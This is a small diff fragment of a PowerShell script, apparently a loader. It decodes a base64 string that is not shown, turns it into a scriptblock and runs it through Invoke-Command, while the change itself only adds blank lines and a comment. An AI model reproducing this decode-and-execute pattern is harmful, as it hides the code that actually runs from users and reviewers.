@@ -2,3 +2,6 @@ $dbs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String
 $dab = [scriptblock]::Create($dbs)
 Invoke-Command -ScriptBlock {$dab}
 echo $dbs
+
+
+#e
